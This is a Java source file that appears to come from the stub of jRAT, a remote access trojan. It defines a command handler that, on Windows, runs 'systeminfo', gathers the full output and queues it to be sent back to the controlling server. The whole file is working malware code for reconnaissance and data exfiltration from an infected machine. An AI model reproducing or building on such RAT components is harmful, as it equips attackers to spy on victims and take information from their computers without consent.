package se.jrat.stub.packets.incoming;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import se.jrat.common.OperatingSystem;
import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.Packet57RawComputerInfo;


public class Packet83WinSysInfo extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			Process p = Runtime.getRuntime().exec("systeminfo");
			BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

			String info = "";
			String line;

			while ((line = reader.readLine()) != null) {
				info += line + "\n";
			}

			Connection.addToSendQueue(new Packet57RawComputerInfo(info));
		}
	}

}